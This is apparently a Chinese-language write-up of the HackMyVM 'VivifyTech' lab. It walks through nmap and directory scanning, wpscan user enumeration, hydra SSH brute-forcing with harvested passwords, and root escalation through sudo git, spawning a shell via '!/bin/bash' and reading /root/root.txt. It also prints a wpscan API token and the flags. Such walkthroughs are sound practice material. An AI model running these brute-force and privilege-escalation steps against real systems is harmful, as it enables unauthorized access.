> ⏲️ Release Date // 2023-12-28
>
> ✔️ MD5 // d8d796aa8ac7998128f555f3c61360a5
>
> ☠ Root // 115
>
> 💀 User // 112

### 主机探测和nmap扫描

主机探测

```bash
nmap -sn 192.168.56.0/24
```

全端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.126
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

指定端口扫描（详细扫描）

```bash
nmap -sT -sV -sC -O -p22,80,3306,33060 192.168.56.126
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

### web渗透

访问web页面

![image-20240527210403589](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527210403589.png)



apache默认页面

#### 目录扫描

```bash
gobuster dir -u http://192.168.56.126 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

扫到

```
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.56.126/wordpress/]
/server-status        (Status: 403) [Size: 279]
```

![image-20240527210600845](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527210600845.png)



wordpress 6.4.1没啥利用的漏洞

#### 利用wpscan

```bash
wpscan --url http://192.168.56.126/wordpress/ --api-token aSaeIFrptoJuKIRRxPteXnJo7lZU8eDtJEKXxMV1RAw -e u
```

枚举一下用户

> [+] sancelisso

#### dirb目录扫描

```bash
dirb http://192.168.56.126 /usr/share/seclists/Discovery/Web-Content/common.txt
```

![image-20240527212218911](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527212218911.png)

#### feroxbuster目录扫描

```bash
feroxbuster -u http://192.168.56.126 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 5 --filter-status 404,403
```

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527212131611.png)

wp-admin后台登录页面，没有弱密码

查看wp-includes目录

发现一个文件

http://192.168.56.126/wordpress/wp-includes/secrets.txt

```
agonglo
tegbesou
paparazzi
womenintech
Password123
```

应该是密码

尝试后台爆破登录

```bash
wpscan --url http://192.168.56.126/wordpress/ -U sancelisso -P pass
```

没有啥东西

尝试寻找更多信息

找到这篇文章

![image-20240527212655875](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527212655875.png)

找到几个人名

> sarah
> mark
> emily
> jake
> alex

再次尝试登录后台

```bash
wpscan --url http://192.168.56.126/wordpress/ -U user -P pass
```

依旧没有结果

### 登录SSH服务

登录后台没结果，那就尝试ssh

```bash
hydra -L user -P pass ssh://192.168.56.126
```

```
[22][ssh] host: 192.168.56.126   login: sarah   password: bohicon
```

拿到一组凭据

> sarah:bohicon

```bash
sarah@VivifyTech:~$ ls -la
total 36
drwx------ 4 sarah sarah 4096 May 27 08:56 .
drwxr-xr-x 6 root  root  4096 Dec  5 16:00 ..
-rw------- 1 sarah sarah    0 Dec  5 17:53 .bash_history
-rw-r--r-- 1 sarah sarah  245 Dec  5 17:33 .bash_logout
-rw-r--r-- 1 sarah sarah 3565 Dec  5 17:48 .bashrc
-rw------- 1 sarah sarah    0 May 27 08:56 .history
drwxr-xr-x 3 sarah sarah 4096 Dec  5 16:19 .local
-rw------- 1 sarah sarah  104 May 27 08:32 .mysql_history
drwxr-xr-x 2 sarah sarah 4096 Dec  5 16:19 .private
-rw-r--r-- 1 sarah sarah  807 Dec  5 15:57 .profile
-rw-r--r-- 1 sarah sarah   27 Dec  5 16:22 user.txt
sarah@VivifyTech:~$ cat user.txt 
HMV{Y0u_G07_Th15_0ne_6543}
sarah@VivifyTech:~$ cd .private/
sarah@VivifyTech:~/.private$ ls
Tasks.txt
sarah@VivifyTech:~/.private$ cat Tasks.txt 
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
```

又拿到另一凭据

> gbodja:4Tch055ouy370N

### 提权

git提权

利用git的diff工具，查看root.txt(盲猜)

```bash
gbodja@VivifyTech:~$ sudo -l
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git
gbodja@VivifyTech:~$ sudo git diff /dev/null /root/root.txt
diff --git a/root/root.txt b/root/root.txt
new file mode 100644
index 0000000..9b04236
--- /dev/null
+++ b/root/root.txt
@@ -0,0 +1 @@
+HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}
```

利用git提权的root

![image-20240527213811011](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527213811011.png)

```bash
sudo git -p help config
```

之后输入`!/bin/bash`

![image-20240527213930747](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240527213930747.png)

```
HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}
```

拿到root.txt